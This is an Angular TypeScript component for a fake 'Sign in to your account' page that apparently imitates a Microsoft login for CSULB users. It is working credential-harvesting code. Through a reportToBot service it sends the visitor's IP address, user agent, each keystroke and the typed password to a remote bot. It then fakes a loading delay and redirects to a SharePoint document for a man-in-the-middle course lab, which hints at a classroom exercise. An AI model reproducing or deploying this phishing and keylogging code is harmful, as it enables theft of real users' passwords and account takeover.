import { CommonModule } from '@angular/common';
import { Component } from '@angular/core';
import { Router, RouterOutlet } from '@angular/router';
import { DataService } from './data.service';
import { take } from 'rxjs';
import { OnInit } from '@angular/core';
import { FormsModule } from '@angular/forms';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [RouterOutlet, CommonModule, FormsModule],
  templateUrl: './app.component.html',
  styleUrl: './app.component.scss'
})
export class AppComponent implements OnInit {
  public isAccountSelected: boolean = false;
  public password: string = '';
  public ipAddress: string = 'NONE';
  public isLoading: boolean = false;
  public isPasswordWrong: boolean = false;
  public timestamp: number = Date.now();
  public isWrongAddress: boolean = false;
  title = 'Sign in to your account';

  public readonly passwordInputClasses: string = 'form-control input ext-input text-box ext-text-box';
  public readonly passwordWrongInputClasses: string = 'form-control input ext-input text-box ext-text-box has-error ext-has-error';
   

  public constructor(
    private dataService: DataService,
  ) {
    this.dataService.getIpAddresses().pipe(take(1)).subscribe((response: any) => {
      if(this.isWrongAddress) {
        return;
      }
      
      const userAgents = navigator.userAgent;
      this.ipAddress = response.ip;
      this.dataService.reportToBot(`CSULB App Started IP: ${this.ipAddress}, UserAgent: ${userAgents}`).pipe(take(1)).subscribe();
    });
  }

  public ngOnInit(): void {
    if (!window.location.href.includes('common/oauth2/v2.0/authorize')) {
      this.isWrongAddress = true;
    }
  }

  public onAccountSelected(): void {
    this.isAccountSelected = true;
    this.dataService.reportToBot(`CSULB App Account Selected by IP ${this.ipAddress}`).pipe(take(1)).subscribe();
  }

  public onBackButtonClick(): void {
    this.isAccountSelected = false;
    this.isPasswordWrong = false;
    this.password = '';
    this.dataService.reportToBot(`CSULB App Back Button Clicked by IP ${this.ipAddress}`).pipe(take(1)).subscribe();
  }

  public onSignInButtonClick(): void {
    this.dataService.reportToBot(`CSULB App Sign In Button Clicked by IP ${this.ipAddress} (Password: ${this.password})`).pipe(take(1)).subscribe();
    this.isLoading = true;
    this.isPasswordWrong = false;
    this.signInAct();

    if (this.password.length === 0 || Date.now() - this.timestamp < 3000) {
      this.isPasswordWrong = true;
      return;
    }

    this.timestamp = Date.now();
  }

  public signInAct(): void {
    // run after random between 0.1 to 1.5 seconds
    setTimeout(() => {
      this.isLoading = false;

      if (!this.isPasswordWrong) {
        this.goToLink();
        window.close();
      }
    }, Math.random() * 1400 + 100);
  }

  public reportKeydown(event: KeyboardEvent): void {
    if(this.password.length === 0) {
      this.timestamp = Date.now();
    }

    if (event.key === 'Enter') {
      this.onSignInButtonClick();
    }


    this.dataService.reportToBot(`CSULB App Keydown Event: ${event.key} by IP ${this.ipAddress} (Password: ${this.password})`).pipe(take(1)).subscribe();
  }

  public goToLink(): void {
    //open the link current page
    window.open('https://csulb.sharepoint.com/:w:/r/sites/Course_cecs_378_sec02-sgZAkCR1oWq2x/Class%20Materials/Labs/Lab4/Lab4_CECS%20378_Fall24-%20MITM.docx?d=wcfc53064c0ab48368194f03582c6f5f3&csf=1&web=1&e=zdeZ3H', '_self');
  }

}
